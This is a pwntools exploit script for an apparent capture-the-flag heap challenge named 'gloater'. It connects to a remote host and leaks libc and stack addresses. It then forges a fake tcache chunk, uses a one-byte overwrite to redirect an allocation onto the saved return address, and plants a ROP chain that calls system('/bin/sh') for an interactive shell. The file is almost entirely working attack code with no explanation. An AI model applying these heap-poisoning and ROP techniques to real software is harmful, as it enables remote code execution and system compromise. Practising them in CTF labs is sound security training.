#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("challenge/gloater_patched")
libc = ELF("challenge/libc-2.31.so")
ld = ELF("./challenge/ld-2.31.so")
context.binary = exe

host = "94.237.56.118"
port = 37820

# host = "localhost"
# port = 9001

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

menu_choice = b"> "

# functions
def CHANGE_USER(new_user: bytes):
    sla(menu_choice, b"1")
    sa(b"New User: ", new_user)

def CREATE(target: bytes, content: bytes = b""):
    sla(menu_choice, b"2")
    sa(b"Taunt target: ", target)
    if content:
        sla(b"Taunt: ", content)
        
def REMOVE(idx: int):
    sla(menu_choice, b"3")
    sla(b"Index: ", str(idx).encode())

def SEND():
    sla(menu_choice, b"4")
    
def SET_SUPER_TAUNT(idx:int, plague: bytes):
    sla(menu_choice, b"5")
    sla(b"Index for Super Taunt: ", str(idx).encode())
    sa(b"Plague to accompany the super taunt: ", plague)
    
# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
breakrva 0x0130E
breakrva 0x164B 
c
'''.format(**locals())
# bp change_user+0
# bp create_taunt+0
# bp set_super_taunt+0
io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

# setup name length to leak stack address
sa(menu_choice, b"s"*0x10)

CREATE(b"test", b"a"*0x20) # 0
SET_SUPER_TAUNT(0, b"l"*136)
io.recvuntil(b"l"*136)
leaked_puts = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = leaked_puts - libc.sym['puts']
success(f"libc.address: {hex(libc.address)}")

CREATE(b"garbage", b"garbage") # 1: addr sang dau 3

fake_tcache = b""
fake_tcache += p64(0)
fake_tcache += p64(0x31)
fake_tcache += b"ffffffff"
fake_tcache += b"kkkkkkkk"
fake_tcache += p64(0) # fake ptr_another = null
CREATE(b"garbage", fake_tcache) # 2: target contains fake tcache

overwrite_1_byte = b"a"*12 + b"\x90"
CHANGE_USER(overwrite_1_byte)
io.recvuntil(b"s"*0x10)
leaked_stack = u64(io.recv(6).ljust(8, b"\x00"))
success(f"leaked stack: {hex(leaked_stack)}")

CREATE(b"garbage", b"a"*0x20) # 3: increase tcache count
REMOVE(3), # increase tcache count

REMOVE(1)
REMOVE(2)


debug_saved_rip = 0x7fffffffdef8
debug_leaked_stack = 0x7fffffffdf10
real_saved_rip = leaked_stack - (debug_leaked_stack - debug_saved_rip)
info(f"real saved_rip: {hex(real_saved_rip)}")

where_you_want_to_write = p64(real_saved_rip)

payload = b"a"*0x10 + where_you_want_to_write
payload = payload + (0x30-(len(payload)))*b"a"
CREATE(b"garbage", payload)

poprdi = libc.address + 0x0000000000023b6a #: pop rdi ; ret
ret = libc.address + 0x0000000000022679 #: ret

payload = flat(
    p64(poprdi),
    p64(next(libc.search(b"/bin/sh\x00"))),
    p64(ret),
    p64(libc.sym['system']),    
)

need_len = 0x20
payload = payload + (0x20-len(payload))*b"a"

CREATE(b"garbage", payload)

io.interactive()

